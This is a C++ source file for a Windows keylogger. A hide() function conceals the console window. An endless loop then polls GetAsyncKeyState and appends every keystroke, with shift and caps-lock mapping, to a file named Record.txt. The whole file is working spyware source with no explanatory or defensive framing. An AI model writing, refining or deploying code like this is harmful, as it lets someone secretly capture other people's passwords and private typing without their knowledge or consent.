#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>
#pragma comment(lib, "user32.lib")

using namespace std;

void log();
void hide();

int main(){
	hide();
	log();
	return 0;
}

void log(){
	char key;

	for (;;){
		for (key = 0; key <= 222; key++){
			if (GetAsyncKeyState(key) == -32767){
				ofstream write ("Record.txt", ios::app);
				if ((key>64) && (key<91) &&! (GetAsyncKeyState(0x10))){
					if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0){
						write << key;
						write.close();
						break;
					}else{
						key+=32;
						write << key;
						write.close();
						break;
					}
				}else if ((key>64) && (key<91)){
					if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0){
						key+=32;
						write << key;
						write.close();
						break;
					}else{
						write << key;
						write.close();
						break;
					}
				}else {
					switch(key){
						case 48 : {
							if (GetAsyncKeyState(0x10))
								write << ")";
							else
								write << "0";
						}
						break;

						case 49 : {
							if (GetAsyncKeyState(0x10))
								write << "!";
							else
								write << "1";
						}
						break;

						case 50 : {
							if (GetAsyncKeyState(0x10))
								write << "@";
							else
								write << "2";
						}
						break;

						case 51 : {
							if (GetAsyncKeyState(0x10))
								write << "#";
							else
								write << "3";
						}
						break;

						case 52 : {
							if (GetAsyncKeyState(0x10))
								write << "$";
							else
								write << "4";
						}
						break;

						case 53 : {
							if (GetAsyncKeyState(0x10))
								write << "%";
							else
								write << "5";
						}
						break;

						case 54 : {
							if (GetAsyncKeyState(0x10))
								write << "^";
							else
								write << "6";
						}
						break;

						case 55 : {
							if (GetAsyncKeyState(0x10))
								write << "&";
							else
								write << "7";
						}
						break;

						case 56 : {
							if (GetAsyncKeyState(0x10))
								write << "*";
							else
								write << "8";
						}
						break;

						case 57 : {
							if (GetAsyncKeyState(0x10))
								write << "(";
							else
								write << "9";
						}
						break;

						case VK_SPACE : write << " ";
						break;

						case VK_BACK : write << "<BackSpace>"; 
						break;

						case VK_RETURN : write << "\n";
						break;

						case VK_TAB : write << "	";
						break;

						case VK_OEM_COMMA : write << ",";
						break;

						case VK_OEM_MINUS : write << "-";
						break;

						case VK_OEM_PLUS : write << "+";
						break;

						case VK_CONTROL : write << "CTRL";
						break;

						case VK_OEM_7 : write << """";
						break;
					}
				}
			}
		}
	}
}

void hide(){
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth,0);
}